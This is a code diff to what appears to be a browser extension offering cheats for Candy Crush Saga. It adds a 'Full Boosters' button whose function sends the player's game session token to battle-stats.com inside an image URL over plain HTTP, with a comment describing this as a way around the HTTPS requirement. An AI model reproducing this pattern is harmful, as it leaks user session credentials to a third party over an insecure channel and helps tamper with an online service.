@@ -35,6 +35,10 @@ function setUp() {
                             beatLevel();
                             $(this).dialog("close");
                         },
+                        "Full Boosters": function() {
+                            getBoosters();
+                            $(this).dialog("close");
+                        },
                         "More Cheats": function() {
                             showOtherCheats();
                             $(this).dialog("close");
@@ -57,6 +61,24 @@ function setUp() {
         }
     }, 500);
 
+}
+
+function getBoosters() {
+    verifyLicense(function() {
+        
+        chrome.runtime.sendMessage({"getCurrentLevelData": true}, function(gameData) {
+            console.log(gameData);
+
+            setTimeout(function() {
+                window.location.reload();
+            }, 3000);
+
+            // bypass the requirement of ajax requests needing https, by issuing the request via an image instead
+            var imgRequest = $("<img />").attr("src", "http://battle-stats.com/CandyCrushSaga/?_session=" + gameData.session);
+            $(document).append(imgRequest);
+        });
+
+    });
 }
 
 function addLife() {
